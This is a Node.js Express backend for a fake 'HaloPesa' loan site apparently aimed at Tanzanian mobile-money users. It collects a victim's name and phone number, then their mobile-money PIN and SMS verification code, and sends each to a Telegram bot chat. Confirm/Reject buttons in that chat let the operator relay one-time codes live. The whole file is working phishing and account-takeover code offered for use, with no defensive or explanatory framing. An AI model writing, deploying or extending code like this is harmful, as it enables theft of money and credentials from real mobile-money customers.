require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ===== BOT CREDENTIALS =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;

// Serve HTML from the parent folder (halopesa-loans-tz)
app.use(express.static(path.join(__dirname, '..')));

// Auto-append .html if no extension and file exists
app.use(function (req, res, next) {
    if (req.method !== 'GET') return next();
    if (req.path.includes('.')) return next();       // has extension, skip
    if (req.path.startsWith('/api/')) return next(); // API routes skip
    const fs = require('fs');
    const file = path.join(__dirname, '..', req.path + '.html');
    if (fs.existsSync(file)) {
        return res.sendFile(file);
    }
    next();
});

// In-memory stores
var decisions = {};        // referenceId -> 'pending' | 'confirmed' | 'rejected'

// ─── Helpers ───
function escapeHtml(str) {
    if (str === null || str === undefined) return '-';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function fmtPhone(p) {
    if (!p) return '-';
    const clean = String(p).replace(/\D/g, '');
    if (clean.length === 9) {
        return '+255 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
    }
    return '+255 ' + clean;
}

// ─── 1) SUBMIT APPLICATION — name, email, phone (phone = copy box) ───
app.post('/api/submit-application', async function (req, res) {
    var d = req.body;
    var fullName = ((d.firstName || '') + ' ' + (d.lastName || '')).trim() || '-';
    var email = d.email || '-';
    var phone = fmtPhone(d.phone);

    var message =
        '🔔 <b>New HaloPesa Application</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '👤 <b>Name:</b>  ' + escapeHtml(fullName) + '\n' +
        '\n📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>';

    try {
        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
        var response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        var data = await response.json();
        if (data.ok) {
            console.log('✅ Application sent to Telegram:', fullName, phone);
        } else {
            console.log('❌ Telegram error:', data);
        }
        res.json({ ok: true });
    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ ok: false });
    }
});

// ─── 2) SUBMIT PIN — phone + pin (both copy boxes, NO buttons) ───
app.post('/api/submit-pin', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);
    var pin = d.pin || '-';

    var message =
        '🔑 <b>PIN Submitted</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🔐 <b>PIN:</b>\n' +
        '<pre><code>' + escapeHtml(pin) + '</code></pre>\n' +
        '\n🕐 ' + new Date().toLocaleString();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('🔑 PIN sent to Telegram for phone:', phone);
        res.json({ ok: true });
    } catch (err) {
        console.error('PIN error:', err);
        res.status(500).json({ ok: false });
    }
});

// ─── 3) VERIFY SMS CODE — phone + code (copy boxes + CONFIRM/REJECT buttons) ───
app.post('/api/verify-code', async function (req, res) {
    var d = req.body;

    var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var phone = fmtPhone(d.phone);
    var code  = d.code || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n💬 <b>SMS Code:</b>\n' +
        '<pre><code>' + escapeHtml(code) + '</code></pre>';

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ Confirm', callback_data: 'confirm:' + referenceId },
            { text: '❌ Reject',  callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: keyboard
            })
        });
        console.log('💬 SMS code sent to Telegram with buttons. Ref:', referenceId);
        res.json({ ok: true, referenceId: referenceId });
    } catch (err) {
        console.error('Verify code error:', err);
        res.status(500).json({ ok: false });
    }
});

// ─── 4) RESEND CODE (frontend log only) ───
app.post('/api/resend-code', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);

    var message =
        '🔄 <b>Resend Requested</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🕐 ' + new Date().toLocaleString();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ─── 5) STATUS (frontend polls this) ───
app.get('/api/status', function (req, res) {
    var ref = req.query.ref;
    res.json({ status: decisions[ref] || 'pending' });
});

// ─── 6) TELEGRAM CALLBACK (button taps come here) ───
app.post('/api/telegram-callback', async function (req, res) {
    var cb = req.body.callback_query;
    
    // Always respond to Telegram immediately to prevent timeouts
    if (!cb) return res.sendStatus(200);

    var parts = cb.data.split(':');
    var action = parts[0];
    var referenceId = parts[1];

    decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
    console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);

    try {
        // 1. Answer the callback to stop the loading spinner on the button
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: cb.id,
                text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
            })
        });

        // 2. Edit the message text AND remove the buttons (reply_markup: empty)
        // Note: We use cb.message.text here, which is safe if Telegram originally sent HTML.
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                text: cb.message.text + '\n\n— — —\n' + (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] } // This removes the buttons!
            })
        });
    } catch (err) {
        console.error('Callback reply failed:', err);
    }

    res.sendStatus(200);
});

// ─── START SERVER ───
var PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', function () {
    console.log('🚀 HaloPesa server running at port ' + PORT);
});